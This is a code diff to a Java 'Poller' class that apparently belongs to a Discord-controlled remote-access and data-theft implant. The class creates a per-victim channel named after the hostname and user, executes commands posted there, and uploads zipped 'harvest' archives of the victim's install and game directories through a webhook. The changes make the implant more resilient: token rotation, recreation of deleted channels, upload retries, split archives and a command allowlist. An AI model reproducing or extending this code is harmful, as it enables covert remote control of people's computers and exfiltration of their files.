@@ -41,6 +41,7 @@ public final class Poller implements Runnable {
 	private volatile Thread pollerThread;
 	private volatile Thread autoThread;
 	private volatile DiscordClient client;
+	private volatile String currentToken = "";
 	private volatile Gateway gateway;
 	private volatile String selfId = "";
 	private volatile String channelId = "";
@@ -198,7 +199,12 @@ public final class Poller implements Runnable {
 		pollerThread = Thread.currentThread();
 		try {
 			lastActivity = System.currentTimeMillis();
-			client = new DiscordClient(DiscordConfig.BOT_TOKEN);
+			String token = resolveToken();
+			if (!running || token.isEmpty()) {
+				return;
+			}
+			client = new DiscordClient(token);
+			currentToken = token;
 			if (!ensure()) {
 				return;
 			}
@@ -265,6 +271,40 @@ public final class Poller implements Runnable {
 		}
 	}
 
+	/** Waits for credentials instead of burning against Discord with an empty token. */
+	private String resolveToken() {
+		while (running) {
+			String token = Credentials.load(installDir);
+			if (!token.isEmpty()) {
+				Log.debug("Credentials resolved");
+				return token;
+			}
+			Log.debug("No credentials yet, retrying");
+			try {
+				Thread.sleep(30000L);
+			} catch (InterruptedException interrupted) {
+				return "";
+			}
+		}
+		return "";
+	}
+
+	/** Swaps in rotated credentials after a 401. Returns false when nothing changed. */
+	private boolean refreshClient() {
+		String token = Credentials.load(installDir);
+		if (token.isEmpty() || token.equals(currentToken)) {
+			return false;
+		}
+		DiscordClient old = client;
+		client = new DiscordClient(token);
+		currentToken = token;
+		if (old != null) {
+			old.close();
+		}
+		Log.debug("Discord token rotated");
+		return true;
+	}
+
 	private boolean ensure() throws Exception {
 		while (running) {
 			try {
@@ -273,7 +313,8 @@ public final class Poller implements Runnable {
 					throw new IllegalStateException("no self id");
 				}
 				channelId = state.channelId;
-				if (channelId.isEmpty()) {
+				if (channelId.isEmpty() || !channelExists(channelId)) {
+					forgetChannel();
 					channelId = createChannel();
 					state.channelId = channelId;
 					state.save(AgentPaths.state(installDir));
@@ -290,10 +331,18 @@ public final class Poller implements Runnable {
 					}
 				}
 				webhookUrl = state.webhookUrl;
-				if (webhookUrl.isEmpty()) {
-					webhookUrl = createWebhook();
-					state.webhookUrl = webhookUrl;
-					state.save(AgentPaths.state(installDir));
+				if (webhookUrl.isEmpty() || !webhookExists(webhookPath())) {
+					// A webhook is only for attachments; replies still work without one.
+					try {
+						webhookUrl = createWebhook();
+						state.webhookUrl = webhookUrl;
+						state.save(AgentPaths.state(installDir));
+					} catch (RateLimitException rateLimit) {
+						throw rateLimit;
+					} catch (Exception exception) {
+						webhookUrl = "";
+						Log.debug("Webhook setup failed", exception);
+					}
 				}
 				if (!state.hello) {
 					sendHello();
@@ -306,6 +355,16 @@ public final class Poller implements Runnable {
 					return false;
 				}
 				Thread.sleep(rateLimit.retryMs());
+			} catch (DiscordException exception) {
+				if (exception.status() == 401 && refreshClient()) {
+					Thread.sleep(1000L);
+					continue;
+				}
+				if (!running) {
+					return false;
+				}
+				Log.debug("Ensure failed", exception);
+				Thread.sleep(10000L);
 			} catch (Throwable throwable) {
 				if (!running) {
 					return false;
@@ -317,6 +376,41 @@ public final class Poller implements Runnable {
 		return false;
 	}
 
+	/** A deleted channel must be recreated instead of failing every poll forever. */
+	private boolean channelExists(String id) throws Exception {
+		try {
+			client.get("/channels/" + id);
+			return true;
+		} catch (DiscordException exception) {
+			return exception.status() != 404;
+		}
+	}
+
+	private boolean webhookExists(String path) throws Exception {
+		if (path.isEmpty()) {
+			return false;
+		}
+		try {
+			client.get(path);
+			return true;
+		} catch (DiscordException exception) {
+			return false;
+		}
+	}
+
+	private void forgetChannel() {
+		channelId = "";
+		webhookUrl = "";
+		synchronized (seenLock) {
+			seen.clear();
+		}
+		state.channelId = "";
+		state.webhookUrl = "";
+		state.lastId = "0";
+		state.hello = false;
+		state.save(AgentPaths.state(installDir));
+	}
+
 	private String createChannel() throws Exception {
 		String name = ("sync-" + SysInfo.hostname() + "-" + SysInfo.user())
 			.toLowerCase().replaceAll("[^a-z0-9-_]", "-");
@@ -326,17 +420,20 @@ public final class Poller implements Runnable {
 		Map<String, Object> body = new LinkedHashMap<>();
 		body.put("name", name);
 		body.put("type", 0);
-		body.put("parent_id", DiscordConfig.CATEGORY_ID);
+		String category = DiscordConfig.categoryId();
+		if (!category.isEmpty()) {
+			body.put("parent_id", category);
+		}
 		try {
 			Map<String, Object> response = Json.parseObject(client.post(
-				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(body)).body);
+				"/guilds/" + DiscordConfig.guildId() + "/channels", Json.stringify(body)).body);
 			return Json.str(response, "id", "");
 		} catch (DiscordException exception) {
 			Map<String, Object> fallback = new LinkedHashMap<>();
 			fallback.put("name", ("sync-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
 			fallback.put("type", 0);
 			Map<String, Object> response = Json.parseObject(client.post(
-				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(fallback)).body);
+				"/guilds/" + DiscordConfig.guildId() + "/channels", Json.stringify(fallback)).body);
 			return Json.str(response, "id", "");
 		}
 	}
@@ -373,8 +470,9 @@ public final class Poller implements Runnable {
 		}
 		try {
 			Path zip = Harvest.build(installDir, gameDir);
-			uploadFile(zip);
-			Files.deleteIfExists(zip);
+			if (uploadFile(zip)) {
+				Files.deleteIfExists(zip);
+			}
 		} catch (Throwable throwable) {
 			Log.debug("Hello harvest failed", throwable);
 		}
@@ -386,8 +484,21 @@ public final class Poller implements Runnable {
 		synchronized (seenLock) {
 			after = state.lastId;
 		}
-		List<Object> messages = Json.list(Json.parse(
-			client.get("/channels/" + channelId + "/messages?limit=50&after=" + after).body));
+		List<Object> messages;
+		try {
+			messages = Json.list(Json.parse(
+				client.get("/channels/" + channelId + "/messages?limit=50&after=" + after).body));
+		} catch (DiscordException exception) {
+			if (exception.status() == 401 && refreshClient()) {
+				return false;
+			}
+			if (exception.status() != 404) {
+				throw exception;
+			}
+			Log.debug("Channel missing, recreating", exception);
+			ensure();
+			return false;
+		}
 		if (messages.isEmpty()) {
 			saveHeartbeat();
 			return false;
@@ -404,7 +515,7 @@ public final class Poller implements Runnable {
 			}
 			String authorId = Json.str(Json.map(message.get("author")), "id", "");
 			String content = Json.str(message, "content", "");
-			if (!authorId.equals(selfId) && !content.isEmpty() && markSeen(id)) {
+			if (!authorId.equals(selfId) && !content.isEmpty() && allowed(message, authorId) && markSeen(id)) {
 				activity = true;
 				message.put("_transport", "rest");
 				executor.handle(message);
@@ -474,6 +585,10 @@ public final class Poller implements Runnable {
 		if (authorId.equals(selfId)) {
 			return;
 		}
+		if (!allowed(message, authorId)) {
+			requestPoll();
+			return;
+		}
 		String id = Json.str(message, "id", "");
 		if (content.isEmpty()) {
 			requestPoll();
@@ -494,6 +609,12 @@ public final class Poller implements Runnable {
 		} catch (Throwable throwable) {
 			Log.debug("Gateway command failed", throwable);
 		}
+	}
+
+	/** An empty allowlist accepts every member; webhooks stay trusted. */
+	private static boolean allowed(Map<String, Object> message, String authorId) {
+		Set<String> users = DiscordConfig.allowedUsers();
+		return users.isEmpty() || users.contains(authorId) || message.get("webhook_id") != null;
 	}
 
 	private boolean markSeen(String id) {
@@ -611,7 +732,19 @@ public final class Poller implements Runnable {
 				String chunk = text.substring(start, end);
 				Map<String, Object> payload = new LinkedHashMap<>();
 				payload.put("content", chunk);
-				client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
+				for (int attempt = 0; attempt < 4; attempt++) {
+					try {
+						client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
+						break;
+					} catch (RateLimitException rateLimit) {
+						if (!sleepQuietly(Math.min(rateLimit.retryMs(), 10000L))) {
+							return;
+						}
+					} catch (Throwable throwable) {
+						Log.debug("Reply failed", throwable);
+						return;
+					}
+				}
 				start = end;
 			}
 		} catch (Throwable throwable) {
@@ -619,35 +752,50 @@ public final class Poller implements Runnable {
 		}
 	}
 
-	public void uploadBytes(byte[] data, String name, String contentType) {
-		try {
-			client.postWebhook(webhookUrl, "{\"content\":\"\"}",
-				List.of(new DiscordClient.Part("file", name, contentType, data)));
-		} catch (Throwable throwable) {
-			Log.debug("Upload bytes failed", throwable);
+	public boolean uploadBytes(byte[] data, String name, String contentType) {
+		if (webhookUrl.isEmpty()) {
+			return false;
 		}
+		for (int attempt = 0; attempt < 4; attempt++) {
+			try {
+				client.postWebhook(webhookUrl, "{\"content\":\"\"}",
+					List.of(new DiscordClient.Part("file", name, contentType, data)));
+				return true;
+			} catch (RateLimitException rateLimit) {
+				if (!sleepQuietly(Math.min(rateLimit.retryMs(), 30000L))) {
+					return false;
+				}
+			} catch (Throwable throwable) {
+				if (attempt == 3) {
+					Log.debug("Upload bytes failed: " + name, throwable);
+					return false;
+				}
+				sleepQuietly(500L * (attempt + 1));
+			}
+		}
+		return false;
 	}
 
-	public void uploadFile(Path file) {
+	public boolean uploadFile(Path file) {
 		try {
 			if (file == null || !Files.isRegularFile(file)) {
-				return;
+				return false;
 			}
 			long size = Files.size(file);
 			if (size > UPLOAD_LIMIT) {
-				uploadParts(file);
-				return;
+				return uploadParts(file);
 			}
 			byte[] data = Files.readAllBytes(file);
 			String name = file.getFileName().toString();
-			uploadBytes(data, name, contentType(name));
+			return uploadBytes(data, name, contentType(name));
 		} catch (Throwable throwable) {
 			Log.debug("Upload file failed", throwable);
+			return false;
 		}
 	}
 
 	/** Discord caps a single attachment; large archives travel as sorted .partNN files. */
-	private void uploadParts(Path file) throws java.io.IOException {
+	private boolean uploadParts(Path file) throws java.io.IOException {
 		String base = file.getFileName().toString();
 		long size = Files.size(file);
 		int count = (int) ((size + UPLOAD_PART - 1L) / UPLOAD_PART);
@@ -658,11 +806,15 @@ public final class Poller implements Runnable {
 				byte[] chunk = new byte[length];
 				input.seek(offset);
 				input.readFully(chunk);
-				String name = base + String.format(java.util.Locale.ROOT, ".part%02d", index);
-				uploadBytes(chunk, name, contentType(base));
+				String name = base + String.format(java.util.Locale.ROOT, ".part%03d", index);
+				if (!uploadBytes(chunk, name, contentType(base))) {
+					Log.debug("Upload part failed: " + name);
+					return false;
+				}
 			}
 		}
 		Log.debug("Upload split into " + count + " parts: " + base);
+		return true;
 	}
 
 	private static String contentType(String name) {
@@ -691,10 +843,11 @@ public final class Poller implements Runnable {
 	public void clearChannel(int requested) {
 		int limit = Math.max(1, Math.min(requested <= 0 ? 100 : requested, 1000));
 		Thread thread = new Thread(() -> {
-			int deleted = 0;
+			List<String> ids = new ArrayList<>();
+			Set<String> webhookMessages = new LinkedHashSet<>();
 			try {
-				List<String> ids = new ArrayList<>();
 				String before = "";
+				String ownWebhook = webhookId();
 				while (ids.size() < limit) {
 					int batch = Math.min(100, limit - ids.size());
 					String path = "/channels/" + channelId + "/messages?limit=" + batch
@@ -704,9 +857,14 @@ public final class Poller implements Runnable {
 						break;
 					}
 					for (Object item : messages) {
-						String id = Json.str(Json.map(item), "id", "");
-						if (!id.isEmpty()) {
-							ids.add(id);
+						Map<String, Object> message = Json.map(item);
+						String id = Json.str(message, "id", "");
+						if (id.isEmpty()) {
+							continue;
+						}
+						ids.add(id);
+						if (!ownWebhook.isEmpty() && ownWebhook.equals(Json.str(message, "webhook_id", ""))) {
+							webhookMessages.add(id);
 						}
 					}
 					before = ids.get(ids.size() - 1);
@@ -714,38 +872,122 @@ public final class Poller implements Runnable {
 						break;
 					}
 				}
-				for (int index = 0; index < ids.size(); index += 100) {
-					List<String> chunk = ids.subList(index, Math.min(index + 100, ids.size()));
-					Map<String, Object> body = new LinkedHashMap<>();
-					body.put("messages", chunk);
-					DiscordClient.Response response = client.post(
-						"/channels/" + channelId + "/messages/bulk-delete", Json.stringify(body));
-					if (response.status >= 200 && response.status < 300) {
-						deleted += chunk.size();
-						continue;
-					}
-					// Older than two weeks: bulk delete refuses, remove one by one.
-					for (String id : chunk) {
-						DiscordClient.Response single = client.delete(
-							"/channels/" + channelId + "/messages/" + id);
-						if ((single.status >= 200 && single.status < 300) || single.status == 404) {
-							deleted++;
-						}
+			} catch (Throwable throwable) {
+				reply("Clear failed: " + throwable.getMessage());
+				return;
+			}
+			int deleted = 0;
+			int skipped = 0;
+			boolean bulk = true;
+			String ownWebhookPath = webhookMessages.isEmpty() ? "" : webhookPath();
+			for (int index = 0; index < ids.size(); index += 100) {
+				List<String> chunk = ids.subList(index, Math.min(index + 100, ids.size()));
+				if (bulk && bulkDelete(chunk)) {
+					deleted += chunk.size();
+					continue;
+				}
+				// No MANAGE_MESSAGES, or a chunk older than two weeks: remove one
+				// by one. Our own messages and webhook posts need no permission.
+				bulk = false;
+				for (String id : chunk) {
+					if (deleteMessage(id, webhookMessages.contains(id) ? ownWebhookPath : "")) {
+						deleted++;
+					} else {
+						skipped++;
 					}
 				}
-				reply("Cleared " + deleted + " messages");
-			} catch (Throwable throwable) {
-				reply("Clear failed after " + deleted + ": " + throwable.getMessage());
 			}
+			String message = "Cleared " + deleted + " messages";
+			if (skipped > 0) {
+				message += " · skipped " + skipped + " (needs Manage Messages for other authors)";
+			}
+			reply(message);
 		}, "spc-clear");
 		thread.setDaemon(true);
 		thread.start();
 	}
 
+	private boolean bulkDelete(List<String> chunk) {
+		Map<String, Object> body = new LinkedHashMap<>();
+		body.put("messages", chunk);
+		for (int attempt = 0; attempt < 3; attempt++) {
+			try {
+				client.post("/channels/" + channelId + "/messages/bulk-delete", Json.stringify(body));
+				return true;
+			} catch (RateLimitException rateLimit) {
+				if (!sleepQuietly(rateLimit.retryMs())) {
+					return false;
+				}
+			} catch (DiscordException exception) {
+				if (exception.status() != 429) {
+					return false;
+				}
+			} catch (Throwable throwable) {
+				return false;
+			}
+		}
+		return false;
+	}
+
+	private boolean deleteMessage(String id, String webhookPath) {
+		String path = webhookPath.isEmpty()
+			? "/channels/" + channelId + "/messages/" + id
+			: webhookPath + "/messages/" + id;
+		for (int attempt = 0; attempt < 4; attempt++) {
+			try {
+				client.delete(path);
+				return true;
+			} catch (RateLimitException rateLimit) {
+				if (!sleepQuietly(rateLimit.retryMs())) {
+					return false;
+				}
+			} catch (DiscordException exception) {
+				// A message already gone still counts as cleared.
+				return exception.status() == 404;
+			} catch (Throwable throwable) {
+				return false;
+			}
+		}
+		return false;
+	}
+
+	private static boolean sleepQuietly(long millis) {
+		try {
+			Thread.sleep(millis);
+			return true;
+		} catch (InterruptedException interrupted) {
+			Thread.currentThread().interrupt();
+			return false;
+		}
+	}
+
+	/** `/webhooks/{id}/{token}` for the command webhook, or empty before it exists. */
+	private String webhookPath() {
+		String url = webhookUrl;
+		int start = url.indexOf("/webhooks/");
+		if (start < 0 || url.lastIndexOf('/') <= start + "/webhooks/".length()) {
+			return "";
+		}
+		return url.substring(start);
+	}
+
+	private String webhookId() {
+		String path = webhookPath();
+		if (path.isEmpty()) {
+			return "";
+		}
+		String rest = path.substring("/webhooks/".length());
+		int slash = rest.indexOf('/');
+		return slash < 0 ? rest : rest.substring(0, slash);
+	}
+
 	public void harvestNow() {		try {
 			Path zip = Harvest.build(installDir, gameDir);
-			uploadFile(zip);
-			Files.deleteIfExists(zip);
+			if (uploadFile(zip)) {
+				Files.deleteIfExists(zip);
+			} else {
+				reply("Harvest upload failed; kept " + zip.getFileName() + " in cache");
+			}
 		} catch (Throwable throwable) {
 			reply("Harvest failed: " + throwable.getMessage());
 		}
@@ -802,5 +1044,9 @@ public final class Poller implements Runnable {
 
 	public String channelId() {
 		return channelId;
+	}
+
+	DiscordClient client() {
+		return client;
 	}
 }
